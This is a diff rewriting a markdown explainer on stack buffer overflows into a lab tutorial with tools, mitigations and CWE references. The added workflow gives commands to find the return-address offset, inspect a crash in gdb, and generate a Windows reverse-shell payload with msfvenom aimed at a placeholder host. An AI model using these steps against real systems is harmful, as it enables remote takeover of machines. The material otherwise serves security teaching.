@@ -1,35 +1,63 @@
-# What is Buffer Overflow?
-Buffer overflow is a type of software vulnerability that occurs when a program tries to store more data in a buffer (a temporary storage area) than it was designed to hold. This extra data can overflow into adjacent memory locations, potentially overwriting important data or code and leading to unpredictable behavior or security exploits.
+# What is a Buffer Overflow?
 
-## How Does Buffer Overflow Work?
-- Buffer: Programs often use buffers to store temporary data, such as user input or variables.
+A Buffer Overflow happens when a program writes more data into a fixed-size buffer than it can hold, spilling into adjacent memory. In unsafe languages like C and C++, that overwrite can clobber the saved return address and redirect execution to attacker-controlled code. It is the foundation of classic memory-corruption exploitation and still shows up in firmware, drivers, and legacy binaries.
 
-- Input: When a program receives input that exceeds the size of the buffer allocated for it, the extra data can overwrite adjacent memory locations.
+## How it works
 
-- Memory Corruption: If the overflowed data reaches critical parts of memory, such as control data or function pointers, it can corrupt the program's execution flow.
+- A buffer of N bytes receives more than N bytes of input
+- The overflow overwrites the saved return address (EIP/RIP) on the stack
+- Control jumps to attacker-supplied shellcode or a ROP chain
 
-- Exploitation: Attackers can craft malicious input to trigger buffer overflows intentionally. By overwriting specific memory locations with their own code, they can hijack the program's execution, inject and execute malicious code, or crash the program.
+## Exploitation workflow (lab)
 
-## Example Scenario
-Imagine a program that reads user input into a buffer of fixed size. If a user enters more data than the buffer can hold, the excess data overflows into adjacent memory locations.
+```bash
+# 1. Find the offset to EIP with a cyclic pattern
+msf-pattern_create -l 2000
 
-For instance, if a buffer is designed to hold 10 characters and a user inputs 15 characters, the extra 5 characters overflow into adjacent memory regions, potentially corrupting critical program data or control structures.
+# 2. After the crash, find where the pattern landed
+msf-pattern_offset -l 2000 -q 39694438
 
-## Impact of Buffer Overflow
-- Code Execution: Buffer overflow vulnerabilities can allow attackers to execute arbitrary code on the target system, potentially leading to unauthorized access, data theft, or system compromise.
+# 3. Confirm control of EIP (send offset bytes + "BBBB")
+python3 -c 'print("A"*offset + "BBBB")'
 
-- Denial of Service: Buffer overflows can crash programs or cause system instability, leading to service interruptions or system downtime.
+# 4. Find bad characters, locate a JMP ESP, then place shellcode
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\x00' -f python
+```
 
-- Security Exploits: Attackers can exploit buffer overflows to bypass security mechanisms, escalate privileges, or execute remote code execution attacks.
+```gdb
+# Inspect the crash in a debugger
+gdb ./vuln
+run $(python3 -c 'print("A"*100)')
+info registers        # is RIP/EIP overwritten with 0x41414141?
+```
 
-## Mitigating Buffer Overflow
-- Input Validation: Implement proper input validation to ensure that user input does not exceed the size of allocated buffers.
+## Tools
 
-- Bounds Checking: Use programming languages or libraries that perform bounds checking automatically to prevent buffer overflow vulnerabilities.
+- [GDB](https://www.gnu.org/software/gdb/) + [pwndbg](https://github.com/pwndbg/pwndbg) / [GEF](https://github.com/hugsy/gef)
+- [pwntools](https://github.com/Gallopsled/pwntools) - scripting exploit development
+- [Immunity Debugger + mona.py](https://www.immunityinc.com/products/debugger/) - Windows workflow
+- [checksec](https://github.com/slimm609/checksec.sh) - inspect binary protections
 
-- Secure Coding Practices: Follow secure coding practices, such as using safe string manipulation functions and avoiding unsafe memory operations.
+## Manual testing
 
-- Address Space Layout Randomization (ASLR): Employ ASLR techniques to randomize memory addresses, making it harder for attackers to predict memory locations for exploitation.
+1. Fuzz inputs with growing lengths until the program crashes
+2. Use a cyclic pattern to find the exact offset to the return address
+3. Identify bad characters that mangle your payload
+4. Redirect execution (JMP ESP / ret2libc / ROP) to your shellcode
 
-## Conclusion
-Buffer overflow vulnerabilities are significant security risks that can lead to code execution exploits and system compromise. By understanding how buffer overflows occur and implementing appropriate security measures such as input validation, bounds checking, and secure coding practices, developers can mitigate the risk of exploitation and protect their systems from malicious attacks. Regular security audits and updates are essential for maintaining a secure software environment.
+## Mitigation
+
+- Use memory-safe languages or safe functions (`strncpy`, `snprintf`, bounds checks)
+- Keep compiler defenses on: stack canaries, ASLR, DEP/NX, RELRO, PIE
+- Fuzz binaries and run static/dynamic analysis in CI
+- Patch and retire legacy unsafe C/C++ components
+
+## Deep dive
+
+- [Buffer Overflow - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
+- [Exploit Education: Phoenix/Protostar](https://exploit.education/)
+
+## CWE
+
+- CWE-120: Buffer Copy without Checking Size of Input
+- CWE-787: Out-of-bounds Write
